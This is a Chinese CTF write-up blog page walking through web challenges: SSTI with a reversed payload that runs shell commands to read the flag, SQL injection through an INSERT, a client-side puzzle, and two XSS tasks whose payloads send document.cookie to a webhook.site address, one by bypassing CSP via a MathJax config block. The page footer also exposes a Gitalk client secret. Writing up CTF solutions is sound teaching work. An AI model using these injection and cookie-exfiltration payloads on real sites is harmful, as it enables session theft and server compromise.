+<p><code>hope&#123;cA5e_anD_P0iNt_Ar3_1mp0rT4nT&#125;</code></p>
+<h2 id="reverser"><a href="#reverser" class="headerlink" title="reverser"></a>reverser</h2><p>这是一道ssti注入题，需要注意的是payload要取反，因为是python3所以需要找一下FileLoader，然后按照常规套路利用builtins中的函数调用系统命令读取flag即可。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">@app.post(&#x27;/&#x27;)</span><br><span class="line">def reverse():</span><br><span class="line">    result = &#x27;&#x27;&#x27;</span><br><span class="line">        &lt;link rel=&quot;stylesheet&quot; href=&quot;style.css&quot; /&gt;</span><br><span class="line">        &lt;div class=&quot;container&quot;&gt;</span><br><span class="line">            &lt;h1&gt;Text Reverser&lt;/h1&gt;</span><br><span class="line">            Reverse any text... now as a web service!</span><br><span class="line">            &lt;form method=&quot;POST&quot;&gt;</span><br><span class="line">                &lt;input type=&quot;text&quot; name=&quot;text&quot;&gt;</span><br><span class="line">                &lt;input type=&quot;submit&quot; value=&quot;Reverse&quot;&gt;</span><br><span class="line">            &lt;/form&gt;</span><br><span class="line">            &lt;p&gt;Output: %s&lt;/p&gt;</span><br><span class="line">        &lt;/div&gt;</span><br><span class="line">    &#x27;&#x27;&#x27;</span><br><span class="line">    output = request.form.get(&#x27;text&#x27;, &#x27;&#x27;)[::-1]</span><br><span class="line">    return render_template_string(result % output)</span><br></pre></td></tr></table></figure>
+
+<img src="/2022/07/25/DiceCTF-2022-WP/image4.png" class="" title="This is an image">
+
+<p>payload如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#125;&#125;)(daer.)&#x27;sl&#x27;(nepop.)&#x27;so&#x27;(]&#x27;__tropmi__&#x27;[]&#x27;__snitliub__&#x27;[__slabolg__.__tini__.]49[)(__sessalcbus__.__esab__.)&#x27;__ssal&#x27;+&#x27;c__&#x27;(__etubirttateg__.][&#123;&#123;</span><br></pre></td></tr></table></figure>
+
+<img src="/2022/07/25/DiceCTF-2022-WP/image5.png" class="" title="This is an image">
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#125;&#125;)(daer.)&#x27;*f%20tac&#x27;(nepop.)&#x27;so&#x27;(]&#x27;__tropmi__&#x27;[]&#x27;__snitliub__&#x27;[__slabolg__.__tini__.]49[)(__sessalcbus__.__esab__.)&#x27;__ssal&#x27;+&#x27;c__&#x27;(__etubirttateg__.][&#123;&#123;</span><br></pre></td></tr></table></figure>
+
+<img src="/2022/07/25/DiceCTF-2022-WP/image6.png" class="" title="This is an image">
+
+<p><code>hope&#123;cant_misuse_templates&#125;</code></p>
+<h2 id="oeps"><a href="#oeps" class="headerlink" title="oeps"></a>oeps</h2><p>一开始看到execute的时候觉得完了，滴水不漏，定睛一看才发现原来里面用了单引号把占位符包起来了，那就起不到防止sql注入的效果，可以直接注。找了一圈发现基本上都有输入检查，只允许字母和数字输入，唯独一个地方没有检查那就是/submit目录下的submission参数，这里可以直接进行注入。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@server.post(<span class="params"><span class="string">&#x27;/submit&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">submit</span>(<span class="params">request</span>):</span><br><span class="line">    token = request.cookies.get(<span class="string">&#x27;token&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    logged_in = (</span><br><span class="line">        <span class="built_in">all</span>(c <span class="keyword">in</span> ALLOWED_CHARACTERS <span class="keyword">for</span> c <span class="keyword">in</span> token) <span class="keyword">and</span></span><br><span class="line">        <span class="built_in">len</span>(connection.execute(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">            select * from users where token = &#x27;%s&#x27;;</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span> % token).fetchall()) == <span class="number">1</span></span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> logged_in:</span><br><span class="line">        <span class="keyword">return</span> (<span class="number">302</span>, <span class="string">&#x27;/?error=Authentication error.&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    data = <span class="keyword">await</span> request.post()</span><br><span class="line">    submission = data.get(<span class="string">&#x27;submission&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> submission == <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> (<span class="number">302</span>, <span class="string">&#x27;/?error=Submission cannot be empty.&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    stripped = submission.replace(<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> stripped != stripped[::-<span class="number">1</span>]:</span><br><span class="line">        <span class="keyword">return</span> (<span class="number">302</span>, <span class="string">&#x27;/?error=Submission must be a palindrome.&#x27;</span>)</span><br><span class="line">    connection.execute(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        insert into pending (user, sentence) values (&#x27;%s&#x27;, &#x27;%s&#x27;);</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span> % (</span><br><span class="line">        token,</span><br><span class="line">        submission</span><br><span class="line">    ))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> (<span class="number">302</span>, <span class="string">&#x27;/&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+<p>与往常的不同，不再是select，而是insert语句。这里插入的是pending数据表，也就是我们访问根目录可以看到的数据表。因此可以将flag查询出来插入pending表中，再访问根目录查看。需要注意的是在python的sqlite中可以使用||进行字符拼接，这里将前面的字符闭合起来之后再将flag拼接上去即可：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag:&#x27;||(select flag from flags));----;))sgalf morf galf tceles(||&#x27;:galf</span><br></pre></td></tr></table></figure>
+
+<img src="/2022/07/25/DiceCTF-2022-WP/image7.png" class="" title="This is an image">
+
+<p>访问根目录查看flag：</p>
+<img src="/2022/07/25/DiceCTF-2022-WP/image8.png" class="" title="This is an image">
+
+<p><code>hope&#123;ecid_gnivlovni_semordnilap_fo_kniht_ton_dluoc&#125;</code></p>
+<h2 id="inspect-me"><a href="#inspect-me" class="headerlink" title="inspect-me"></a>inspect-me</h2><p>这道题挺恶心的，F12开启开发者工具之后就会把表单后面的内容替换掉，然后不断循环刷新控制台。一开始只能获取到表单前面那部分的代码，发现他会检测窗口大小等一系列操作来判断是否开启开发者工具，所以一开始我的思路是用chromedriver来控制开启页面，然后用page_source来获取源码，但是发现不行因为chromedriver本来就是调用了开发者工具来实现的，会被检查出来。</p>
+<p>!<img src="/2022/07/25/DiceCTF-2022-WP/image9.png" class="" title="This is an image"></p>
+<p>经过仔细研究发现页面内容替换需要条件触发，而检测这些触发条件的是js代码，他们的作用范围只在本标签，那么标签的上一级他就管不到了。所以可以直接选中浏览器地址栏url然后按ctrl+u直接看源码。以下是表单后面的源码，实现的是对flag进行凯撒加密，偏移量为13。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">    (() =&gt; &#123;</span><br><span class="line">        const scripts = document.querySelectorAll(&#x27;script&#x27;);</span><br><span class="line">        scripts.forEach((script) =&gt; script.remove());</span><br><span class="line"></span><br><span class="line">        const chr = (c) =&gt; c.charCodeAt(0);</span><br><span class="line"></span><br><span class="line">        const form = document.querySelector(&#x27;form&#x27;);</span><br><span class="line">        form.addEventListener(&#x27;submit&#x27;, (event) =&gt; &#123;</span><br><span class="line">            event.preventDefault();</span><br><span class="line">            const input = document.querySelector(&#x27;input[type=&quot;text&quot;]&#x27;);</span><br><span class="line">            const output = [];</span><br><span class="line">            for (const char of input.value.split(&#x27;&#x27;).map(chr)) &#123;</span><br><span class="line">                if (chr(&#x27;a&#x27;) &lt;= char &amp;&amp; char &lt;= chr(&#x27;z&#x27;)) &#123;</span><br><span class="line">                    output.push(chr(&#x27;a&#x27;) + ((char - chr(&#x27;a&#x27;) + 13) % 26));</span><br><span class="line">                &#125; else if (chr(&#x27;A&#x27;) &lt;= char &amp;&amp; char &lt;= chr(&#x27;Z&#x27;)) &#123;</span><br><span class="line">                    output.push(chr(&#x27;A&#x27;) + ((char - chr(&#x27;A&#x27;) + 13) % 26));</span><br><span class="line">                &#125; else &#123;</span><br><span class="line">                    output.push(char);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            const target = &#x27;ubcr&#123;pyvrag_fvqr_pyvpur&#125;&#x27;;</span><br><span class="line">            if (output.map((c) =&gt; String.fromCharCode(c)).join(&#x27;&#x27;) === target) &#123;</span><br><span class="line">                document.querySelector(&#x27;.content&#x27;).textContent = &#x27;Correct!&#x27;;</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                input.removeAttribute(&#x27;style&#x27;);</span><br><span class="line">                input.offsetWidth;</span><br><span class="line">                input.style.animation = &#x27;shake 0.25s&#x27;;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;)();</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p><code>hope&#123;client_side_cliche&#125;</code></p>
+<h2 id="pastebin"><a href="#pastebin" class="headerlink" title="pastebin"></a>pastebin</h2><p>服务端提供/new来给我们创建一个页面，随后会给出地址供访问，题目大概的思路就是利用/new生成带有xss代码的页面，然后把这个页面提交给admin-bot访问，admin-bot访问我们生成的页面时利用xss代码将cookie外带即可。</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">app.<span class="title function_">post</span>(<span class="string">&#x27;/new&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">const</span> paste = (req.<span class="property">body</span>.<span class="property">paste</span> ?? <span class="string">&#x27;&#x27;</span>).<span class="title function_">toString</span>();</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (paste.<span class="property">length</span> == <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> res.<span class="title function_">redirect</span>(<span class="string">`/flash?message=Paste cannot be empty!`</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (paste.<span class="title function_">search</span>(<span class="regexp">/&lt;.*&gt;/</span>) !== -<span class="number">1</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> res.<span class="title function_">redirect</span>(<span class="string">`/flash?message=Illegal characters in paste!`</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> id = <span class="title function_">add</span>(paste);</span><br><span class="line">  res.<span class="title function_">redirect</span>(<span class="string">`/view/<span class="subst">$&#123;id&#125;</span>`</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/view/:id&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">const</span> id = req.<span class="property">params</span>.<span class="property">id</span>;</span><br><span class="line">  res.<span class="title function_">type</span>(<span class="string">&#x27;html&#x27;</span>);</span><br><span class="line">  res.<span class="title function_">end</span>(<span class="string">`</span></span><br><span class="line"><span class="string">    &lt;link rel=&quot;stylesheet&quot; href=&quot;/style.css&quot; /&gt;</span></span><br><span class="line"><span class="string">    &lt;div class=&quot;container&quot;&gt;</span></span><br><span class="line"><span class="string">        &lt;h1&gt;Paste&lt;/h1&gt;</span></span><br><span class="line"><span class="string">        <span class="subst">$&#123;pastes.get(id) ?? <span class="string">&#x27;Paste does not exist!&#x27;</span>&#125;</span></span></span><br><span class="line"><span class="string">    &lt;/div&gt;</span></span><br><span class="line"><span class="string">  `</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
+
+<p>从上面的源码可以看到，写入的内容是会有检查的，不能够含有<code>&lt;&gt;</code>，这里需要xss绕过。我们可以使用iframe的半尖括号来进行绕过，然后在src中写入js代码实现cookie窃取，payload如下：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>= <span class="string">javascript:location.href</span>=<span class="string">&quot;https://webhook.site/99f07c43-3dd0-402e-afc8-a654a2dc6983/?flag=&quot;</span>+<span class="attr">document.cookie</span> &lt;</span></span><br></pre></td></tr></table></figure>
+
+<img src="/2022/07/25/DiceCTF-2022-WP/image10.png" class="" title="This is an image">
+
+<p>再将如下链接提交给Admin Bot访问即可：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://pastebin.mc.ax/view/54c293d08e3c57c75ddee9af984431c1</span><br></pre></td></tr></table></figure>
+
+<p>提交之后就可以在我们实现准备好的webhook这里查看flag。</p>
+<img src="/2022/07/25/DiceCTF-2022-WP/image11.png" class="" title="This is an image">
+
+<p><code>hope&#123;the_pastebin_was_irrelvant&#125;</code></p>
+<h2 id="mk"><a href="#mk" class="headerlink" title="mk"></a>mk</h2><p>这道题也是xss，不过他的限制比较严格，内容安全策略（CSP）如下，除了谷歌的验证码域名外，其他的都需要遵循同源策略，而且script不允许内联代码运行，这里需要绕过CSP。</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">fastify.<span class="title function_">addHook</span>(<span class="string">&#x27;preHandler&#x27;</span>, <span class="title function_">async</span> (req, res) =&gt; &#123;</span><br><span class="line">	res.<span class="title function_">header</span>(<span class="string">&#x27;Content-Security-Policy&#x27;</span>, [</span><br><span class="line">		<span class="string">&quot;default-src &#x27;self&#x27;&quot;</span>,</span><br><span class="line">		<span class="string">&quot;base-uri &#x27;self&#x27;&quot;</span>,</span><br><span class="line">		<span class="string">&quot;font-src &#x27;self&#x27;&quot;</span>,</span><br><span class="line">		<span class="string">&quot;frame-ancestors &#x27;none&#x27;&quot;</span>,</span><br><span class="line">		<span class="string">&quot;img-src &#x27;none&#x27;&quot;</span>,</span><br><span class="line">		<span class="string">&quot;object-src &#x27;none&#x27;&quot;</span>,</span><br><span class="line">		<span class="string">&quot;script-src &#x27;self&#x27; &#x27;unsafe-eval&#x27; https://www.google.com/recaptcha/ https://www.gstatic.com/recaptcha/&quot;</span>,</span><br><span class="line">		<span class="string">&quot;script-src-attr &#x27;none&#x27;&quot;</span>,</span><br><span class="line">		<span class="string">&quot;style-src &#x27;self&#x27; &#x27;unsafe-inline&#x27;&quot;</span>,</span><br><span class="line">		<span class="string">&quot;frame-src https://www.google.com/recaptcha/ https://recaptcha.google.com/recaptcha/&quot;</span></span><br><span class="line">	].<span class="title function_">join</span>(<span class="string">&#x27;;&#x27;</span>));</span><br><span class="line"></span><br><span class="line">	res.<span class="title function_">header</span>(<span class="string">&#x27;X-Content-Type-Options&#x27;</span>, <span class="string">&#x27;nosniff&#x27;</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
+
+<p>可以注意到源码给出了Mathjax这个插件，这其实是一个数学公式的渲染插件，之前确实爆过xss攻击的漏洞，可以直接执行eval函数来进行RCE，但是这里给出的版本是2.7.9并不包含这个漏洞，这里就不能用。但是插件Mathjax允许通过<code>&lt;script type=&quot;text/x-mathjax-config&quot;&gt;&lt;script/&gt;</code>来进行参数设置，同时标签内除了根据它规定的格式设置参数之外还可以运行JavaScript代码，因此就可以利用它来绕过CSP执行JavaScript代码，从而走私cookie。</p>
+<p>构造的页面payload如下：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;X-UA-Compatible&quot;</span> <span class="attr">content</span>=<span class="string">&quot;IE=edge&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Document<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/x-mathjax-config&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">        location.<span class="property">href</span>=<span class="string">`https://webhook.site/99f07c43-3dd0-402e-afc8-a654a2dc6983/?<span class="subst">$&#123;<span class="variable language_">document</span>.cookie&#125;</span>`</span>;</span></span><br><span class="line"><span class="language-javascript">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span> <span class="attr">src</span>=<span class="string">&quot;/MathJax/MathJax.js&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>将payload与其<a target="_blank" rel="noopener" href="https://mk.mc.ax/render?content=">https://mk.mc.ax/render?content=</a>  拼接后url编码，再发送给admin-bot访问，admin-bot加载页面后就会运行准备好的跳转代码，将cookie作为参数发送到事先准备好的webhook地址。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https%3A%2F%2Fmk.mc.ax%2Frender%3Fcontent%3D%3C!DOCTYPE%20html%3E%20%3Chtml%20lang%3D%22en%22%3E%20%3Chead%3E%20%20%20%20%20%3Cmeta%20charset%3D%22UTF-8%22%3E%20%20%20%20%20%3Cmeta%20http-equiv%3D%22X-UA-Compatible%22%20content%3D%22IE%3Dedge%22%3E%20%20%20%20%20%3Cmeta%20name%3D%22viewport%22%20content%3D%22width%3Ddevice-width%2C%20initial-scale%3D1.0%22%3E%20%20%20%20%20%3Ctitle%3EDocument%3C%2Ftitle%3E%20%3C%2Fhead%3E%20%3Cbody%3E%20%20%20%20%20%3Cscript%20type%3D%22text%2Fx-mathjax-config%22%3E%20%20%20%20%20%20%20%20%20location.href%3D%60https%3A%2F%2Fwebhook.site%2F99f07c43-3dd0-402e-afc8-a654a2dc6983%2F%3F%24%7Bdocument.cookie%7D%60%3B%20%20%20%20%20%3C%2Fscript%3E%20%20%20%20%20%3Cscript%20type%3D%22text%2Fjavascript%22%20src%3D%22%2FMathJax%2FMathJax.js%22%3E%20%20%20%20%20%3C%2Fscript%3E%20%3C%2Fbody%3E%20%3C%2Fhtml%3E</span><br></pre></td></tr></table></figure>
+
+<p>然后我们就可以在webhook这里看到flag了。</p>
+<img src="/2022/07/25/DiceCTF-2022-WP/image12.png" class="" title="This is an image">
+
+<p><code>hope&#123;make_sure_to_check_your_dependencies&#125;</code></p>
+
+      
+       <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。可以在下面评论区评论，也可以邮件至 hututu1024@126.com </span>
+    </div>
+</article>
+
+
+
+
+
+    <div id="comments"></div>
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.css">
+
+<script type="text/javascript">
+    $.getScript('/js/gitalk.js', function () {
+        var gitalk = new Gitalk({
+            clientID: 'd7042e9d767dec00bcfa',
+            clientSecret: '5f92ec6cc40ce20cf0bd5924af68102d10b4de27',
+            repo: 'hututu2.github.io',
+            owner: 'hututu2',
+            admin: ['hututu2'],
+            id: decodeURI(location.pathname),
+            distractionFreeMode: 'true',
+            language: 'zh-CN',
+            perPage: parseInt('10',10)
+        })
+        gitalk.render('comments')
+    })
+</script>
+
+
+
+
+    
+
+
+
+
+    </div>
+    <div class="copyright">
+        <p class="footer-entry"><span class="miit">
+                <img src="/img/gov.png" title="中华人民共和国工业和信息化部">
+                <a target="_blank" rel="noopener" href="https://beian.miit.gov.cn/">粤ICP备2023078889号-1</a>
+        </span>
+    
+    ©2021-2022 hututu
+</p>
+<p class="footer-entry">Built with <a href="https://hexo.io/" target="_blank">Hexo</a> and <a href="https://github.com/yelog/hexo-theme-3-hexo" target="_blank">3-hexo</a> theme</p>
+
+    </div>
+    <div class="full-toc">
+        <button class="full" data-title="切换全屏 快捷键 s"><span class="min "></span></button>
+<a class="" id="rocket" ></a>
+
+    </div>
+</div>
+
+</body>
+<script src="/js/jquery.pjax.js?v=1.1.0" ></script>
+
+<script src="/js/script.js?v=1.1.0" ></script>
+<script>
+    var img_resize = 'default';
+    function initArticle() {
+        /*渲染对应的表格样式*/
+        
+            $("#post .pjax table").addClass("green_title");
+        
+
+        /*渲染打赏样式*/
+        
+
+        /*高亮代码块行号*/
+        
+
+        /*访问数量*/
+        
+        $.getScript("//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js");
+        
+
+        /*代码高亮，行号对齐*/
+        $('.pre-numbering').css('line-height',$('.has-numbering').css('line-height'));
+
+        
+        
+    }
+
+    /*打赏页面隐藏与展示*/
+    
+
+</script>
+
+<!--加入行号的高亮代码块样式-->
+
+<!--自定义样式设置-->
+<style>
+    
+    
+    .nav {
+        width: 542px;
+    }
+    .nav.fullscreen {
+        margin-left: -542px;
+    }
+    .nav-left {
+        width: 120px;
+    }
+    
+    
+    @media screen and (max-width: 1468px) {
+        .nav {
+            width: 492px;
+        }
+        .nav.fullscreen {
+            margin-left: -492px;
+        }
+        .nav-left {
+            width: 100px;
+        }
+    }
+    
+    
+    @media screen and (max-width: 1024px) {
+        .nav {
+            width: 492px;
+            margin-left: -492px
+        }
+        .nav.fullscreen {
+            margin-left: 0;
+        }
+    }
+    
+    @media screen and (max-width: 426px) {
+        .nav {
+            width: 100%;
+        }
+        .nav-left {
+            width: 100%;
+        }
+    }
+    
+    
+    .nav-right .title-list nav a .post-title, .nav-right .title-list #local-search-result a .post-title {
+        color: #383636;
+    }
+    
+    
+    .nav-right .title-list nav a .post-date, .nav-right .title-list #local-search-result a .post-date {
+        color: #5e5e5f;
+    }
+    
+    
+    .nav-right nav a.hover, #local-search-result a.hover{
+        background-color: #e2e0e0;
+    }
+    
+    
+
+    /*列表样式*/
+    
+
+    /* 背景图样式 */
+    
+    
+
+
+    /*引用块样式*/
+    
+
+    /*文章列表背景图*/
+    
+
+    
+</style>
+
+
+
+
+
+
+
+</html>
